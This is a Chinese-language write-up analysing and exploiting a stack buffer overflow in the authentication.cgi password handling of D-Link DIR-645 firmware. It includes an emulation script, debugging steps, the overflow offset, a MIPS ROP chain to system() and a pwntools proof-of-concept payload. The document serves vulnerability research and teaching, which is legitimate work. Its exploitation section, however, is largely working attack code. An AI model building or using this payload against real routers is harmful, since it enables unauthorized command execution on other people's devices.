# D-Link DIR-645路由器栈溢出漏洞分析

## 1\. 漏洞介绍

该漏洞是CGI脚本在处理authentication.cgi请求，来读取POST参数中的"password"参数的值时造成的缓冲区溢出。

固件版本 **DIR645A1_FW103B11**

下载地址
http://files.dlink.com.au/products/DIR-645/REV_A/Firmware/DIR645_FW103B11/DIR645A1_FW103B11.zip

## 2.漏洞分析

### 2.1 固件分析

解压固件

![image](https://image.3001.net/images/20210819/1629360179_611e1033d5d63a2d5913a.png!small)

查找漏洞点authentication.cgi

![image](https://image.3001.net/images/20210819/1629360197_611e10457f514485dcc8b.png!small)

可以看到autthentication.cgi是指向htdocs/cgibin的软连接，真正的漏洞代码存在于cgibin中

### 2.2 漏洞成因分析

#### 2.2.1 调试准备

模拟运行程序(参考 **揭秘家用路由器0day漏洞挖掘技术 run_cgi.sh** )

测试脚本(改进run_cgi.sh)

    
    
    #!/bin/bash
    
    INPUT="$1" #第一个参数
    TEST="$2" #第二个参数
    LEN=$(echo -n "$INPUT" | wc -c) #获取第一个参数长度
    PORT="1234" # gdb调试端口
    cp $(which qemu-mipsel-static) ./qemu-mipsel-static
    echo $TEST # 打印第二个参数
    echo "$INPUT" | chroot . ./qemu-mipsel-static -E CONTENT_LENGTH=$LEN -E CONTENT_TYPE="application/x-www-form-urlencoded" -E REQUEST_METHOD="POST" -E REQUEST_URI="/authentication.cgi" -E REMOTE_ADDR="192.168.1.1" -g $PORT /htdocs/web/authentication.cgi
    

**注意点**

> 书中qemu-mipsel模拟运行出现报错，需要使用qemu-mipsel-static才可以
>
> -E 指令定义运行环境变量
>
> -g gdb调试端口

#### 2.2.1 测试漏洞

鉴于"password"参数值没有校验数据大小，可以构造0x600个脏数据

    
    
    $ sudo ./run_cgi.sh `python -c "print 'uid=1234&password='+'A' * 0x6000"` "uid=1234"
    

在authentication_main函数中下断点(0x400B024)

![image](https://image.3001.net/images/20210819/1629360255_611e107fb31e34b6bf864.png!small)

定位函数返回值，查看saved_ra被覆盖情况(7FFFEFAC)

![image](https://image.3001.net/images/20210819/1629360282_611e109aa95464dea8ec5.png!small)

F8单步调试，运行到0x0040B500

![image](https://image.3001.net/images/20210819/1629360316_611e10bc1e0083d81b95e.png!small)

此时saved_ra还没有被覆盖脏数据

![image](https://image.3001.net/images/20210819/1629360328_611e10c80352ce4469387.png!small)

执行read函数之后，saved_ra已被脏数据填充

![image](https://image.3001.net/images/20210819/1629360345_611e10d908b3c91aff4df.png!small)

综上我们可以发现read函数引发了缓冲区溢出漏洞

#### 2.3 read函数如何引发缓冲区溢出

read函数原型

    
    
    #include <unistd.h>
    ssize_t read(int fd,void *buf,size_t count);
    

fileno函数原型

    
    
    #inlcude <stdio.h>
    int fileno(FILE *stream);
    

获取文件描述符之后读取缓冲区数据

![image](https://image.3001.net/images/20210819/1629360365_611e10ed80d5d9d166193.png!small)

read函数从CONTENT_LENGTH读取长度的数据，但由于v70这个临时变量大小仅为1024字节，导致长度被定义为任意大小，因此导致缓冲区溢出

## 3\. 漏洞利用

利用过程如下:

> 确定控制偏移
>
> 构造ROP
>
> 构建攻击利用数据

### 3.1 确定偏移

用工具pattern offset来计算偏移

下载地址 https://github.com/desword/shellcode_tools

用patternLocOffset.py创建1160字节脏数据

    
    
    $ python patternLocOffset.py -c -l 1160 -f test_auth
    [*] Create pattern string contains 1160 characters ok!
    [+] output to test_auth ok!
    [+] take time: 0.0004 s
    

计算偏移

    
    
    $ ./run_cgi.sh `python -c "print 'uid=1234&password='+open('test_auth','r').read(1160)"` "uid=1234"
    

运行到authentication_main函数返回地址

![image](https://image.3001.net/images/20210819/1629360380_611e10fcbc11cc7427ecf.png!small)

$S0 = 0x42386842 $S0寄存器函数返回寄存器的值

$RA = 0x42306A42

计算偏移(1014字节)

    
    
    $ python patternLocOffset.py -s 0x42386842 -l 1160
    [*] Create pattern string contains 1160 characters ok!
    [*] No exact matches, looking for likely candidates...
    [+] Possible match at offset 1014 (adjusted another-endian)
    [+] take time: 0.0007 s
    

### 3.2 构造ROP

#### 3.2.1 构造gadget

通过充分利用覆盖寄存器实现system函数调用

查看system函数地址(0x00053200)

![image](https://image.3001.net/images/20210819/1629360397_611e110d88fd944331a3b.png!small)

搜索把堆栈数据放入寄存器的指令片段

    
    
    mipsrop.stackfinders()
    

![image](https://image.3001.net/images/20210819/1629360422_611e11268dba2c9541fe6.png!small)

![image](https://image.3001.net/images/20210819/1629360439_611e1137967c61f2ef932.png!small)

0x00159CC处的指令，该指令第一步将$sp+16地址存入寄存器$S5中，而在偏移地址0x159E0将$S5存入$a0寄存器，这里将system函数地址存入$S0寄存器，然后在$SP+16处填充需要执行的命令，实现对system函数的调用。

考虑到\x00被截断的风险，需要对system函数地址进行转换

搜索相应指令片段

    
    
    mipsrop.find("addiu $s0,1")
    

![image](https://image.3001.net/images/20210819/1629360469_611e11550382edac50b50.png!small)

![image](https://image.3001.net/images/20210819/1629360567_611e11b7486c25c6df124.png!small)

**完整的ROP构造和调用过程**

![image](https://image.3001.net/images/20210819/1629360578_611e11c26215b327a0059.png!small)

#### 3.2.2 寻找基地址

libc.so.0是动态加载的，需要获取libc.so基地址

模拟运行程序

    
    
    $ ./run_cgi.sh `python -c "print 'uid=1234&password='+open('test_auth','r').read(1160)"` "uid=1234"
    

gdb-multiarch 调试

    
    
    $ gdb-multiarch htdocs/cgibin
    pwndbg> target remote :1234
    pwndbg> c
    pwndbg> c
    pwndbg> vmmap
    

查看基地址(0x7F73800)

![image](https://image.3001.net/images/20210819/1629360592_611e11d0134128d341f2e.png!small)

system函数的真实地址= 基地址 + 偏移地址 = 0x7F73800 + 0x53200 = 7FCFA00

 **注意点:**

  1. 需要程序完整运行，才能在vmmap中显示libuClibc.so动态库。(调试过程需要两次continue)

 **疑问** ？

 **揭秘家用路由器0day漏洞挖掘技术** 书中对于本次漏洞采用了和sprintf一样的绕过方法，怕\x00被截断，所以采用减1加
1的方法，获得最终的system函数地址。但read函数本身不会因为\x00而被截断，所以是否可以直接使用system函数地址,大家可以尝试一下。

### 3.3 POC测试

    
    
    from pwn import *
    
    context.endian = "little"
    context.arch = "mips"
    base_addr =  0x7f738000
    system_addr_1 = 0x531ff
    gadget1 = 0x158c8
    gadget2 = 0x159cc
    
    padding = 'A' * 1014
    padding += p32(base_addr + system_addr_1) # s0
    padding += 'A' * 4                        # s1
    padding += 'A' * 4                        # s2
    padding += 'A' * 4                        # s3
    padding += 'A' * 4                        # s4
    padding += p32(base_addr + gadget2)       # s5
    padding += 'A' * 4                        # s6
    padding += 'A' * 4                        # s7
    padding += 'A' * 4                        # fp
    padding += p32(base_addr + gadget1)       # ra
    padding += 'B' * 0x10
    padding += 'ls'
    
    with open("shellcode",'wb') as f:
        f.write(padding)
    

模拟运行程序

    
    
    $ sudo ./run_cgi.sh `python -c "print 'uid=1234&password='+open('/home/iot/Desktop/shellcode','r').read()"` "uid=1234"
    

结果

![image](https://image.3001.net/images/20210819/1629360608_611e11e010844f723c40f.png!small)

## 总结

该漏洞主要对用户传入的数据没有进行安全检查，最终导致缓冲区溢出。即用户所有输入的数据都是不可信任的，需要开发者对传入数据进行有效安全检查。

## 参考

> 揭秘家用路由器0day漏洞挖掘技术

